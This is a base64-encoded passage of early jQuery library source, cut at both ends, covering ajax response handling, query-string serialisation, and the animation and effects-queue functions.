c3REb25lID0gdHJ1ZTsKCQkJCQoJCQkJLy8gY2xlYXIgcG9sbCBpbnRlcnZhbAoJCQkJaWYgKGl2YWwpIHsKCQkJCQljbGVhckludGVydmFsKGl2YWwpOwoJCQkJCWl2YWwgPSBudWxsOwoJCQkJfQoJCQkJCgkJCQlzdGF0dXMgPSBpc1RpbWVvdXQgPT0gInRpbWVvdXQiICYmICJ0aW1lb3V0IiB8fAoJCQkJCSFqUXVlcnkuaHR0cFN1Y2Nlc3MoIHhtbCApICYmICJlcnJvciIgfHwKCQkJCQlzLmlmTW9kaWZpZWQgJiYgalF1ZXJ5Lmh0dHBOb3RNb2RpZmllZCggeG1sLCBzLnVybCApICYmICJub3Rtb2RpZmllZCIgfHwKCQkJCQkic3VjY2VzcyI7CgoJCQkJaWYgKCBzdGF0dXMgPT0gInN1Y2Nlc3MiICkgewoJCQkJCS8vIFdhdGNoIGZvciwgYW5kIGNhdGNoLCBYTUwgZG9jdW1lbnQgcGFyc2UgZXJyb3JzCgkJCQkJdHJ5IHsKCQkJCQkJLy8gcHJvY2VzcyB0aGUgZGF0YSAocnVucyB0aGUgeG1sIHRocm91Z2ggaHR0cERhdGEgcmVnYXJkbGVzcyBvZiBjYWxsYmFjaykKCQkJCQkJZGF0YSA9IGpRdWVyeS5odHRwRGF0YSggeG1sLCBzLmRhdGFUeXBlICk7CgkJCQkJfSBjYXRjaChlKSB7CgkJCQkJCXN0YXR1cyA9ICJwYXJzZXJlcnJvciI7CgkJCQkJfQoJCQkJfQoKCQkJCS8vIE1ha2Ugc3VyZSB0aGF0IHRoZSByZXF1ZXN0IHdhcyBzdWNjZXNzZnVsIG9yIG5vdG1vZGlmaWVkCgkJCQlpZiAoIHN0YXR1cyA9PSAic3VjY2VzcyIgKSB7CgkJCQkJLy8gQ2FjaGUgTGFzdC1Nb2RpZmllZCBoZWFkZXIsIGlmIGlmTW9kaWZpZWQgbW9kZS4KCQkJCQl2YXIgbW9kUmVzOwoJCQkJCXRyeSB7CgkJCQkJCW1vZFJlcyA9IHhtbC5nZXRSZXNwb25zZUhlYWRlcigiTGFzdC1Nb2RpZmllZCIpOwoJCQkJCX0gY2F0Y2goZSkge30gLy8gc3dhbGxvdyBleGNlcHRpb24gdGhyb3duIGJ5IEZGIGlmIGhlYWRlciBpcyBub3QgYXZhaWxhYmxlCgkKCQkJCQlpZiAoIHMuaWZNb2RpZmllZCAmJiBtb2RSZXMgKQoJCQkJCQlqUXVlcnkubGFzdE1vZGlmaWVkW3MudXJsXSA9IG1vZFJlczsKCgkJCQkJLy8gSlNPTlAgaGFuZGxlcyBpdHMgb3duIHN1Y2Nlc3MgY2FsbGJhY2sKCQkJCQlpZiAoICFqc29ucCApCgkJCQkJCXN1Y2Nlc3MoKTsJCgkJCQl9IGVsc2UKCQkJCQlqUXVlcnkuaGFuZGxlRXJyb3IocywgeG1sLCBzdGF0dXMpOwoKCQkJCS8vIEZpcmUgdGhlIGNvbXBsZXRlIGhhbmRsZXJzCgkJCQljb21wbGV0ZSgpOwoKCQkJCS8vIFN0b3AgbWVtb3J5IGxlYWtzCgkJCQlpZiAoIHMuYXN5bmMgKQoJCQkJCXhtbCA9IG51bGw7CgkJCX0KCQl9OwoJCQoJCWlmICggcy5hc3luYyApIHsKCQkJLy8gZG9uJ3QgYXR0YWNoIHRoZSBoYW5kbGVyIHRvIHRoZSByZXF1ZXN0LCBqdXN0IHBvbGwgaXQgaW5zdGVhZAoJCQl2YXIgaXZhbCA9IHNldEludGVydmFsKG9ucmVhZHlzdGF0ZWNoYW5nZSwgMTMpOyAKCgkJCS8vIFRpbWVvdXQgY2hlY2tlcgoJCQlpZiAoIHMudGltZW91dCA+IDAgKQoJCQkJc2V0VGltZW91dChmdW5jdGlvbigpewoJCQkJCS8vIENoZWNrIHRvIHNlZSBpZiB0aGUgcmVxdWVzdCBpcyBzdGlsbCBoYXBwZW5pbmcKCQkJCQlpZiAoIHhtbCApIHsKCQkJCQkJLy8gQ2FuY2VsIHRoZSByZXF1ZXN0CgkJCQkJCXhtbC5hYm9ydCgpOwoJCgkJCQkJCWlmKCAhcmVxdWVzdERvbmUgKQoJCQkJCQkJb25yZWFkeXN0YXRlY2hhbmdlKCAidGltZW91dCIgKTsKCQkJCQl9CgkJCQl9LCBzLnRpbWVvdXQpOwoJCX0KCQkJCgkJLy8gU2VuZCB0aGUgZGF0YQoJCXRyeSB7CgkJCXhtbC5zZW5kKHMuZGF0YSk7CgkJfSBjYXRjaChlKSB7CgkJCWpRdWVyeS5oYW5kbGVFcnJvcihzLCB4bWwsIG51bGwsIGUpOwoJCX0KCQkKCQkvLyBmaXJlZm94IDEuNSBkb2Vzbid0IGZpcmUgc3RhdGVjaGFuZ2UgZm9yIHN5bmMgcmVxdWVzdHMKCQlpZiAoICFzLmFzeW5jICkKCQkJb25yZWFkeXN0YXRlY2hhbmdlKCk7CgoJCWZ1bmN0aW9uIHN1Y2Nlc3MoKXsKCQkJLy8gSWYgYSBsb2NhbCBjYWxsYmFjayB3YXMgc3BlY2lmaWVkLCBmaXJlIGl0IGFuZCBwYXNzIGl0IHRoZSBkYXRhCgkJCWlmICggcy5zdWNjZXNzICkKCQkJCXMuc3VjY2VzcyggZGF0YSwgc3RhdHVzICk7CgoJCQkvLyBGaXJlIHRoZSBnbG9iYWwgY2FsbGJhY2sKCQkJaWYgKCBzLmdsb2JhbCApCgkJCQlqUXVlcnkuZXZlbnQudHJpZ2dlciggImFqYXhTdWNjZXNzIiwgW3htbCwgc10gKTsKCQl9CgoJCWZ1bmN0aW9uIGNvbXBsZXRlKCl7CgkJCS8vIFByb2Nlc3MgcmVzdWx0CgkJCWlmICggcy5jb21wbGV0ZSApCgkJCQlzLmNvbXBsZXRlKHhtbCwgc3RhdHVzKTsKCgkJCS8vIFRoZSByZXF1ZXN0IHdhcyBjb21wbGV0ZWQKCQkJaWYgKCBzLmdsb2JhbCApCgkJCQlqUXVlcnkuZXZlbnQudHJpZ2dlciggImFqYXhDb21wbGV0ZSIsIFt4bWwsIHNdICk7CgoJCQkvLyBIYW5kbGUgdGhlIGdsb2JhbCBBSkFYIGNvdW50ZXIKCQkJaWYgKCBzLmdsb2JhbCAmJiAhIC0talF1ZXJ5LmFjdGl2ZSApCgkJCQlqUXVlcnkuZXZlbnQudHJpZ2dlciggImFqYXhTdG9wIiApOwoJCX0KCQkKCQkvLyByZXR1cm4gWE1MSHR0cFJlcXVlc3QgdG8gYWxsb3cgYWJvcnRpbmcgdGhlIHJlcXVlc3QgZXRjLgoJCXJldHVybiB4bWw7Cgl9LAoKCWhhbmRsZUVycm9yOiBmdW5jdGlvbiggcywgeG1sLCBzdGF0dXMsIGUgKSB7CgkJLy8gSWYgYSBsb2NhbCBjYWxsYmFjayB3YXMgc3BlY2lmaWVkLCBmaXJlIGl0CgkJaWYgKCBzLmVycm9yICkgcy5lcnJvciggeG1sLCBzdGF0dXMsIGUgKTsKCgkJLy8gRmlyZSB0aGUgZ2xvYmFsIGNhbGxiYWNrCgkJaWYgKCBzLmdsb2JhbCApCgkJCWpRdWVyeS5ldmVudC50cmlnZ2VyKCAiYWpheEVycm9yIiwgW3htbCwgcywgZV0gKTsKCX0sCgoJLy8gQ291bnRlciBmb3IgaG9sZGluZyB0aGUgbnVtYmVyIG9mIGFjdGl2ZSBxdWVyaWVzCglhY3RpdmU6IDAsCgoJLy8gRGV0ZXJtaW5lcyBpZiBhbiBYTUxIdHRwUmVxdWVzdCB3YXMgc3VjY2Vzc2Z1bCBvciBub3QKCWh0dHBTdWNjZXNzOiBmdW5jdGlvbiggciApIHsKCQl0cnkgewoJCQkvLyBJRSBlcnJvciBzb21ldGltZXMgcmV0dXJucyAxMjIzIHdoZW4gaXQgc2hvdWxkIGJlIDIwNCBzbyB0cmVhdCBpdCBhcyBzdWNjZXNzLCBzZWUgIzE0NTAKCQkJcmV0dXJuICFyLnN0YXR1cyAmJiBsb2NhdGlvbi5wcm90b2NvbCA9PSAiZmlsZToiIHx8CgkJCQkoIHIuc3RhdHVzID49IDIwMCAmJiByLnN0YXR1cyA8IDMwMCApIHx8IHIuc3RhdHVzID09IDMwNCB8fCByLnN0YXR1cyA9PSAxMjIzIHx8CgkJCQlqUXVlcnkuYnJvd3Nlci5zYWZhcmkgJiYgci5zdGF0dXMgPT0gdW5kZWZpbmVkOwoJCX0gY2F0Y2goZSl7fQoJCXJldHVybiBmYWxzZTsKCX0sCgoJLy8gRGV0ZXJtaW5lcyBpZiBhbiBYTUxIdHRwUmVxdWVzdCByZXR1cm5zIE5vdE1vZGlmaWVkCglodHRwTm90TW9kaWZpZWQ6IGZ1bmN0aW9uKCB4bWwsIHVybCApIHsKCQl0cnkgewoJCQl2YXIgeG1sUmVzID0geG1sLmdldFJlc3BvbnNlSGVhZGVyKCJMYXN0LU1vZGlmaWVkIik7CgoJCQkvLyBGaXJlZm94IGFsd2F5cyByZXR1cm5zIDIwMC4gY2hlY2sgTGFzdC1Nb2RpZmllZCBkYXRlCgkJCXJldHVybiB4bWwuc3RhdHVzID09IDMwNCB8fCB4bWxSZXMgPT0galF1ZXJ5Lmxhc3RNb2RpZmllZFt1cmxdIHx8CgkJCQlqUXVlcnkuYnJvd3Nlci5zYWZhcmkgJiYgeG1sLnN0YXR1cyA9PSB1bmRlZmluZWQ7CgkJfSBjYXRjaChlKXt9CgkJcmV0dXJuIGZhbHNlOwoJfSwKCglodHRwRGF0YTogZnVuY3Rpb24oIHIsIHR5cGUgKSB7CgkJdmFyIGN0ID0gci5nZXRSZXNwb25zZUhlYWRlcigiY29udGVudC10eXBlIik7CgkJdmFyIHhtbCA9IHR5cGUgPT0gInhtbCIgfHwgIXR5cGUgJiYgY3QgJiYgY3QuaW5kZXhPZigieG1sIikgPj0gMDsKCQl2YXIgZGF0YSA9IHhtbCA/IHIucmVzcG9uc2VYTUwgOiByLnJlc3BvbnNlVGV4dDsKCgkJaWYgKCB4bWwgJiYgZGF0YS5kb2N1bWVudEVsZW1lbnQudGFnTmFtZSA9PSAicGFyc2VyZXJyb3IiICkKCQkJdGhyb3cgInBhcnNlcmVycm9yIjsKCgkJLy8gSWYgdGhlIHR5cGUgaXMgInNjcmlwdCIsIGV2YWwgaXQgaW4gZ2xvYmFsIGNvbnRleHQKCQlpZiAoIHR5cGUgPT0gInNjcmlwdCIgKQoJCQlqUXVlcnkuZ2xvYmFsRXZhbCggZGF0YSApOwoKCQkvLyBHZXQgdGhlIEphdmFTY3JpcHQgb2JqZWN0LCBpZiBKU09OIGlzIHVzZWQuCgkJaWYgKCB0eXBlID09ICJqc29uIiApCgkJCWRhdGEgPSBldmFsKCIoIiArIGRhdGEgKyAiKSIpOwoKCQlyZXR1cm4gZGF0YTsKCX0sCgoJLy8gU2VyaWFsaXplIGFuIGFycmF5IG9mIGZvcm0gZWxlbWVudHMgb3IgYSBzZXQgb2YKCS8vIGtleS92YWx1ZXMgaW50byBhIHF1ZXJ5IHN0cmluZwoJcGFyYW06IGZ1bmN0aW9uKCBhICkgewoJCXZhciBzID0gW107CgoJCS8vIElmIGFuIGFycmF5IHdhcyBwYXNzZWQgaW4sIGFzc3VtZSB0aGF0IGl0IGlzIGFuIGFycmF5CgkJLy8gb2YgZm9ybSBlbGVtZW50cwoJCWlmICggYS5jb25zdHJ1Y3RvciA9PSBBcnJheSB8fCBhLmpxdWVyeSApCgkJCS8vIFNlcmlhbGl6ZSB0aGUgZm9ybSBlbGVtZW50cwoJCQlqUXVlcnkuZWFjaCggYSwgZnVuY3Rpb24oKXsKCQkJCXMucHVzaCggZW5jb2RlVVJJQ29tcG9uZW50KHRoaXMubmFtZSkgKyAiPSIgKyBlbmNvZGVVUklDb21wb25lbnQoIHRoaXMudmFsdWUgKSApOwoJCQl9KTsKCgkJLy8gT3RoZXJ3aXNlLCBhc3N1bWUgdGhhdCBpdCdzIGFuIG9iamVjdCBvZiBrZXkvdmFsdWUgcGFpcnMKCQllbHNlCgkJCS8vIFNlcmlhbGl6ZSB0aGUga2V5L3ZhbHVlcwoJCQlmb3IgKCB2YXIgaiBpbiBhICkKCQkJCS8vIElmIHRoZSB2YWx1ZSBpcyBhbiBhcnJheSB0aGVuIHRoZSBrZXkgbmFtZXMgbmVlZCB0byBiZSByZXBlYXRlZAoJCQkJaWYgKCBhW2pdICYmIGFbal0uY29uc3RydWN0b3IgPT0gQXJyYXkgKQoJCQkJCWpRdWVyeS5lYWNoKCBhW2pdLCBmdW5jdGlvbigpewoJCQkJCQlzLnB1c2goIGVuY29kZVVSSUNvbXBvbmVudChqKSArICI9IiArIGVuY29kZVVSSUNvbXBvbmVudCggdGhpcyApICk7CgkJCQkJfSk7CgkJCQllbHNlCgkJCQkJcy5wdXNoKCBlbmNvZGVVUklDb21wb25lbnQoaikgKyAiPSIgKyBlbmNvZGVVUklDb21wb25lbnQoIGFbal0gKSApOwoKCQkvLyBSZXR1cm4gdGhlIHJlc3VsdGluZyBzZXJpYWxpemF0aW9uCgkJcmV0dXJuIHMuam9pbigiJiIpLnJlcGxhY2UoLyUyMC9nLCAiKyIpOwoJfQoKfSk7CmpRdWVyeS5mbi5leHRlbmQoewoJc2hvdzogZnVuY3Rpb24oc3BlZWQsY2FsbGJhY2spewoJCXJldHVybiBzcGVlZCA/CgkJCXRoaXMuYW5pbWF0ZSh7CgkJCQloZWlnaHQ6ICJzaG93Iiwgd2lkdGg6ICJzaG93Iiwgb3BhY2l0eTogInNob3ciCgkJCX0sIHNwZWVkLCBjYWxsYmFjaykgOgoJCQkKCQkJdGhpcy5maWx0ZXIoIjpoaWRkZW4iKS5lYWNoKGZ1bmN0aW9uKCl7CgkJCQl0aGlzLnN0eWxlLmRpc3BsYXkgPSB0aGlzLm9sZGJsb2NrIHx8ICIiOwoJCQkJaWYgKCBqUXVlcnkuY3NzKHRoaXMsImRpc3BsYXkiKSA9PSAibm9uZSIgKSB7CgkJCQkJdmFyIGVsZW0gPSBqUXVlcnkoIjwiICsgdGhpcy50YWdOYW1lICsgIiAvPiIpLmFwcGVuZFRvKCJib2R5Iik7CgkJCQkJdGhpcy5zdHlsZS5kaXNwbGF5ID0gZWxlbS5jc3MoImRpc3BsYXkiKTsKCQkJCQkvLyBoYW5kbGUgYW4gZWRnZSBjb25kaXRpb24gd2hlcmUgY3NzIGlzIC0gZGl2IHsgZGlzcGxheTpub25lOyB9IG9yIHNpbWlsYXIKCQkJCQlpZiAodGhpcy5zdHlsZS5kaXNwbGF5ID09ICJub25lIikKCQkJCQkJdGhpcy5zdHlsZS5kaXNwbGF5ID0gImJsb2NrIjsKCQkJCQllbGVtLnJlbW92ZSgpOwoJCQkJfQoJCQl9KS5lbmQoKTsKCX0sCgkKCWhpZGU6IGZ1bmN0aW9uKHNwZWVkLGNhbGxiYWNrKXsKCQlyZXR1cm4gc3BlZWQgPwoJCQl0aGlzLmFuaW1hdGUoewoJCQkJaGVpZ2h0OiAiaGlkZSIsIHdpZHRoOiAiaGlkZSIsIG9wYWNpdHk6ICJoaWRlIgoJCQl9LCBzcGVlZCwgY2FsbGJhY2spIDoKCQkJCgkJCXRoaXMuZmlsdGVyKCI6dmlzaWJsZSIpLmVhY2goZnVuY3Rpb24oKXsKCQkJCXRoaXMub2xkYmxvY2sgPSB0aGlzLm9sZGJsb2NrIHx8IGpRdWVyeS5jc3ModGhpcywiZGlzcGxheSIpOwoJCQkJdGhpcy5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOwoJCQl9KS5lbmQoKTsKCX0sCgoJLy8gU2F2ZSB0aGUgb2xkIHRvZ2dsZSBmdW5jdGlvbgoJX3RvZ2dsZTogalF1ZXJ5LmZuLnRvZ2dsZSwKCQoJdG9nZ2xlOiBmdW5jdGlvbiggZm4sIGZuMiApewoJCXJldHVybiBqUXVlcnkuaXNGdW5jdGlvbihmbikgJiYgalF1ZXJ5LmlzRnVuY3Rpb24oZm4yKSA/CgkJCXRoaXMuX3RvZ2dsZSggZm4sIGZuMiApIDoKCQkJZm4gPwoJCQkJdGhpcy5hbmltYXRlKHsKCQkJCQloZWlnaHQ6ICJ0b2dnbGUiLCB3aWR0aDogInRvZ2dsZSIsIG9wYWNpdHk6ICJ0b2dnbGUiCgkJCQl9LCBmbiwgZm4yKSA6CgkJCQl0aGlzLmVhY2goZnVuY3Rpb24oKXsKCQkJCQlqUXVlcnkodGhpcylbIGpRdWVyeSh0aGlzKS5pcygiOmhpZGRlbiIpID8gInNob3ciIDogImhpZGUiIF0oKTsKCQkJCX0pOwoJfSwKCQoJc2xpZGVEb3duOiBmdW5jdGlvbihzcGVlZCxjYWxsYmFjayl7CgkJcmV0dXJuIHRoaXMuYW5pbWF0ZSh7aGVpZ2h0OiAic2hvdyJ9LCBzcGVlZCwgY2FsbGJhY2spOwoJfSwKCQoJc2xpZGVVcDogZnVuY3Rpb24oc3BlZWQsY2FsbGJhY2spewoJCXJldHVybiB0aGlzLmFuaW1hdGUoe2hlaWdodDogImhpZGUifSwgc3BlZWQsIGNhbGxiYWNrKTsKCX0sCgoJc2xpZGVUb2dnbGU6IGZ1bmN0aW9uKHNwZWVkLCBjYWxsYmFjayl7CgkJcmV0dXJuIHRoaXMuYW5pbWF0ZSh7aGVpZ2h0OiAidG9nZ2xlIn0sIHNwZWVkLCBjYWxsYmFjayk7Cgl9LAoJCglmYWRlSW46IGZ1bmN0aW9uKHNwZWVkLCBjYWxsYmFjayl7CgkJcmV0dXJuIHRoaXMuYW5pbWF0ZSh7b3BhY2l0eTogInNob3cifSwgc3BlZWQsIGNhbGxiYWNrKTsKCX0sCgkKCWZhZGVPdXQ6IGZ1bmN0aW9uKHNwZWVkLCBjYWxsYmFjayl7CgkJcmV0dXJuIHRoaXMuYW5pbWF0ZSh7b3BhY2l0eTogImhpZGUifSwgc3BlZWQsIGNhbGxiYWNrKTsKCX0sCgkKCWZhZGVUbzogZnVuY3Rpb24oc3BlZWQsdG8sY2FsbGJhY2spewoJCXJldHVybiB0aGlzLmFuaW1hdGUoe29wYWNpdHk6IHRvfSwgc3BlZWQsIGNhbGxiYWNrKTsKCX0sCgkKCWFuaW1hdGU6IGZ1bmN0aW9uKCBwcm9wLCBzcGVlZCwgZWFzaW5nLCBjYWxsYmFjayApIHsKCQl2YXIgb3B0YWxsID0galF1ZXJ5LnNwZWVkKHNwZWVkLCBlYXNpbmcsIGNhbGxiYWNrKTsKCgkJcmV0dXJuIHRoaXNbIG9wdGFsbC5xdWV1ZSA9PT0gZmFsc2UgPyAiZWFjaCIgOiAicXVldWUiIF0oZnVuY3Rpb24oKXsKCQkJaWYgKCB0aGlzLm5vZGVUeXBlICE9IDEpCgkJCQlyZXR1cm4gZmFsc2U7CgoJCQl2YXIgb3B0ID0galF1ZXJ5LmV4dGVuZCh7fSwgb3B0YWxsKTsKCQkJdmFyIGhpZGRlbiA9IGpRdWVyeSh0aGlzKS5pcygiOmhpZGRlbiIpLCBzZWxmID0gdGhpczsKCQkJCgkJCWZvciAoIHZhciBwIGluIHByb3AgKSB7CgkJCQlpZiAoIHByb3BbcF0gPT0gImhpZGUiICYmIGhpZGRlbiB8fCBwcm9wW3BdID09ICJzaG93IiAmJiAhaGlkZGVuICkKCQkJCQlyZXR1cm4galF1ZXJ5LmlzRnVuY3Rpb24ob3B0LmNvbXBsZXRlKSAmJiBvcHQuY29tcGxldGUuYXBwbHkodGhpcyk7CgoJCQkJaWYgKCBwID09ICJoZWlnaHQiIHx8IHAgPT0gIndpZHRoIiApIHsKCQkJCQkvLyBTdG9yZSBkaXNwbGF5IHByb3BlcnR5CgkJCQkJb3B0LmRpc3BsYXkgPSBqUXVlcnkuY3NzKHRoaXMsICJkaXNwbGF5Iik7CgoJCQkJCS8vIE1ha2Ugc3VyZSB0aGF0IG5vdGhpbmcgc25lYWtzIG91dAoJCQkJCW9wdC5vdmVyZmxvdyA9IHRoaXMuc3R5bGUub3ZlcmZsb3c7CgkJCQl9CgkJCX0KCgkJCWlmICggb3B0Lm92ZXJmbG93ICE9IG51bGwgKQoJCQkJdGhpcy5zdHlsZS5vdmVyZmxvdyA9ICJoaWRkZW4iOwoKCQkJb3B0LmN1ckFuaW0gPSBqUXVlcnkuZXh0ZW5kKHt9LCBwcm9wKTsKCQkJCgkJCWpRdWVyeS5lYWNoKCBwcm9wLCBmdW5jdGlvbihuYW1lLCB2YWwpewoJCQkJdmFyIGUgPSBuZXcgalF1ZXJ5LmZ4KCBzZWxmLCBvcHQsIG5hbWUgKTsKCgkJCQlpZiAoIC90b2dnbGV8c2hvd3xoaWRlLy50ZXN0KHZhbCkgKQoJCQkJCWVbIHZhbCA9PSAidG9nZ2xlIiA/IGhpZGRlbiA/ICJzaG93IiA6ICJoaWRlIiA6IHZhbCBdKCBwcm9wICk7CgkJCQllbHNlIHsKCQkJCQl2YXIgcGFydHMgPSB2YWwudG9TdHJpbmcoKS5tYXRjaCgvXihbKy1dPSk/KFtcZCstLl0rKSguKikkLyksCgkJCQkJCXN0YXJ0ID0gZS5jdXIodHJ1ZSkgfHwgMDsKCgkJCQkJaWYgKCBwYXJ0cyApIHsKCQkJCQkJdmFyIGVuZCA9IHBhcnNlRmxvYXQocGFydHNbMl0pLAoJCQkJCQkJdW5pdCA9IHBhcnRzWzNdIHx8ICJweCI7CgoJCQkJCQkvLyBXZSBuZWVkIHRvIGNvbXB1dGUgc3RhcnRpbmcgdmFsdWUKCQkJCQkJaWYgKCB1bml0ICE9ICJweCIgKSB7CgkJCQkJCQlzZWxmLnN0eWxlWyBuYW1lIF0gPSAoZW5kIHx8IDEpICsgdW5pdDsKCQkJCQkJCXN0YXJ0ID0gKChlbmQgfHwgMSkgLyBlLmN1cih0cnVlKSkgKiBzdGFydDsKCQkJCQkJCXNlbGYuc3R5bGVbIG5hbWUgXSA9IHN0YXJ0ICsgdW5pdDsKCQkJCQkJfQoKCQkJCQkJLy8gSWYgYSArPS8tPSB0b2tlbiB3YXMgcHJvdmlkZWQsIHdlJ3JlIGRvaW5nIGEgcmVsYXRpdmUgYW5pbWF0aW9uCgkJCQkJCWlmICggcGFydHNbMV0gKQoJCQkJCQkJZW5kID0gKChwYXJ0c1sxXSA9PSAiLT0iID8gLTEgOiAxKSAqIGVuZCkgKyBzdGFydDsKCgkJCQkJCWUuY3VzdG9tKCBzdGFydCwgZW5kLCB1bml0ICk7CgkJCQkJfSBlbHNlCgkJCQkJCWUuY3VzdG9tKCBzdGFydCwgdmFsLCAiIiApOwoJCQkJfQoJCQl9KTsKCgkJCS8vIEZvciBKUyBzdHJpY3QgY29tcGxpYW5jZQoJCQlyZXR1cm4gdHJ1ZTsKCQl9KTsKCX0sCgkKCXF1ZXVlOiBmdW5jdGlvbih0eXBlLCBmbil7CgkJaWYgKCBqUXVlcnkuaXNGdW5jdGlvbih0eXBlKSB8fCAoIHR5cGUgJiYgdHlwZS5jb25zdHJ1Y3RvciA9PSBBcnJheSApKSB7CgkJCWZuID0gdHlwZTsKCQkJdHlwZSA9ICJmeCI7CgkJfQoKCQlpZiAoICF0eXBlIHx8ICh0eXBlb2YgdHlwZSA9PSAic3RyaW5nIiAmJiAhZm4pICkKCQkJcmV0dXJuIHF1ZXVlKCB0aGlzWzBdLCB0eXBlICk7CgoJCXJldHVybiB0aGlzLmVhY2goZnVuY3Rpb24oKXsKCQkJaWYgKCBmbi5jb25zdHJ1Y3RvciA9PSBBcnJheSApCgkJCQlxdWV1ZSh0aGlzLCB0eXBlLCBmbik7CgkJCWVsc2UgewoJCQkJcXVldWUodGhpcywgdHlwZSkucHVzaCggZm4gKTsKCQkJCgkJCQlpZiAoIHF1ZXVlKHRoaXMsIHR5cGUpLmxlbmd0aCA9PSAxICkKCQkJCQlmbi5hcHBseSh0aGlzKTsKCQkJfQoJCX0pOwoJfSwKCglzdG9wOiBmdW5jdGlvbihjbGVhclF1ZXVlLCBnb3RvRW5kKXsKCQl2YXIgdGltZXJzID0galF1ZXJ5LnRpbWVyczsKCgkJaWYgKGNsZWFyUXVldWUpCgkJCXRoaXMucXVldWUoW10pOwoKCQl0aGlzLmVhY2goZnVuY3Rpb24oKXsKCQkJLy8gZ28gaW4gcmV2ZXJzZSBvcmRlciBzbyBhbnl0aGluZyBhZGRlZCB0byB0aGUgcXVldWUgZHVyaW5nIHRoZSBsb29wIGlzIGlnbm9yZWQKCQkJZm9yICggdmFyIGkgPSB0aW1lcnMubGVuZ3RoIC0gMTsgaSA+PSAwOyBpLS0gKQoJCQkJaWYgKCB0aW1lcnNbaV0uZWxlbSA9PSB0aGlzICkgewoJCQkJCWlmIChnb3RvRW5kKQoJCQkJCQkvLyBmb3JjZSB0aGUgbmV4dCBzdGVwIHRvIGJlIHRoZSBsYXN0CgkJCQkJCXRpbWVyc1tpXSh0cnVlKTsKCQkJCQl0aW1lcnMuc3BsaWNlKGksIDEpOwoJCQkJfQoJCX0pOwoKCQkvLyBzdGFydCB0aGUgbmV4dCBpbiB0aGUgcXVldWUgaWYgdGhlIGxhc3Qgc3RlcCB3YXNuJ3QgZm9yY2VkCgkJaWYgKCFnb3RvRW5kKQoJCQl0aGlzLmRlcXVldWUoKTsKCgkJcmV0dXJuIHRoaXM7Cgl9Cgp9KTsKCnZhciBxdWV1ZSA9IGZ1bmN0aW9uKCBlbGVtLCB0eXBlLCBhcnJheSApIHsKCWlmICggIWVsZW0gKQoJCXJldHVybiB1bmRlZmluZWQ7CgoJdHlwZSA9IHR5cGUgfHwgImZ4IjsKCgl2YXIgcSA9IGpRdWVyeS5kYXRhKCBlbGVtLCB0eXBlICsgInF1ZXVlIiApOwoKCWlmICggIXEgfHwgYXJyYXkgKQoJCXEgPSBqUXVlcnkuZGF0YSggZWxlbSwgdHlwZSArICJxdWV1ZSIsIAoJCQlhcnJheSA/IGpRdWVyeS5tYWtlQXJyYXkoYXJyYXkpIDogW10gKTsKCglyZXR1cm4gcTsKfTsKCmpRdWVyeS5mbi5kZXF1ZXVlID0gZnVuY3Rpb24odHlwZSl7Cgl0eXBlID0gdHlwZSB8fCAiZngiOwoKCXJldHVybiB0aGlzLmVhY2goZnVuY3Rpb24oKXsKCQl2YXIgcSA9IHF1ZXVlKHRoaXMsIHR5cGUpOwoKCQlxLnNoaWZ0KCk7CgoJCWlmICggcS5sZW5ndGggKQoJCQlxWzBdLmFwcGx5KCB0aGlzICk7Cgl9KTsKfTsKCmpRdWVyeS5leHRlbmQoewoJCglzcGVlZDogZnVuY3Rpb24oc3BlZWQsIGVhc2luZywgZm4pIHsKCQl2YXIgb3B0ID0gc3BlZWQgJiYgc3BlZWQuY29uc3RydWN0b3IgPT0gT2JqZWN0ID8gc3BlZWQgOiB7CgkJCWNvbXBsZXRlOiBmbiB8fCAhZm4gJiYgZWFzaW5nIHx8IAoJCQkJalF1ZXJ5LmlzRnVuY3Rpb24oIHNwZWVkICkgJiYgc3BlZWQsCgkJCWR1cmF0aW9uOiBzcGVlZCwKCQkJZWFzaW5nOiBmbiAmJiBlYXNpbmcgfHwgZWFzaW5nICYmIGVhc2luZy5jb25zdHJ1Y3RvciAhPSBGdW5jdGlvbiAmJiBlYXNpbmcKCQl9OwoKCQlvcHQuZHVyYXRpb24gPSAob3B0LmR1cmF0aW9uICYmIG9wdC5kdXJhdGlvbi5jb25zdHJ1Y3RvciA9PSBOdW1iZXIgPyAKCQkJb3B0LmR1cmF0aW9uIDogCgkJCXsgc2xvdzogNjAwLCBmYXN0OiAyMDAgfVtvcHQuZHVyYXRpb25dKSB8fCA0MDA7CgkKCQkvLyBRdWV1ZWluZwoJCW9wdC5vbGQgPSBvcHQuY29tcGxldGU7CgkJb3B0LmNvbXBsZXRlID0gZnVuY3Rpb24oKXsKCQkJaWYgKCBvcHQucXVldWUgIT09IGZhbHNlICkKCQkJCWpRdWVyeSh0aGlzKS5kZXF1ZXVlKCk7CgkJCWlmICggalF1ZXJ5LmlzRnVuY3Rpb24oIG9wdC5vbGQgKSApCgkJCQlvcHQub2xkLmFwcGx5KCB0aGlzICk7CgkJfTsKCQoJCXJldHVybiBvcHQ7Cgl9LAoJCgllYXNpbmc6IHsKCQlsaW5lYXI6IGZ1bmN0aW9uKCBwLCBuLCBmaXJzdE51bSwgZGlmZiApIHsKCQkJcmV0dXJuIGZpcnN0TnVtICsgZGlmZiAqIHA7CgkJfSwKCQlzd2luZzogZnVuY3Rpb24oIHAsIG4sIGZpcnN0TnVtLCBkaWZmICkgewoJCQlyZXR1cm4gKCgtTWF0aC5jb3MocCpNYXRoLlBJKS8yKSArIDAuNSkgKiBkaWZmICsgZmlyc3ROdW07CgkJfQoJfSwKCQoJdGltZXJzOiBbXSwKCXRpbWVySWQ6IG51bGwsCgoJZng6IGZ1bmN0aW9uKCBlbGVtLCBvcHRpb25zLCBwcm9wICl7CgkJdGhpcy5vcHRpb25zID0gb3B0aW9uczsKCQl0aGlzLmVsZW0gPSBlbGVtOwoJCXRoaXMucHJvcCA9IHByb3A7CgoJCWlmICggIW9wdGlvbnMub3JpZyApCgkJCW9wdGlvbnMub3JpZyA9IHt9OwoJfQoKfSk7CgpqUXVlcnkuZngucHJvdG90eXBlID0gewoKCS8vIFNpbXBsZSBmdW5jdGlvbiBmb3Igc2V0dGluZyBhIHN0eWxlIHZhbHVlCgl1cGRhdGU6IGZ1bmN0aW9uKCl7CgkJaWYgKCB0aGlzLm9wdGlvbnMuc3RlcCApCgkJCXRoaXMub3B0aW9ucy5zdGVwLmFwcGx5KCB0aGlzLmVsZW0sIFsgdGhpcy5ub3csIHRoaXMgXSApOwoKCQkoalF1ZXJ5LmZ4LnN0ZXBbdGhpcy5wcm9wXSB8fCBqUXVlcnkuZnguc3RlcC5fZGVmYXVsdCkoIHRoaXMgKTsKCgkJLy8gU2V0IGRpc3BsYXkg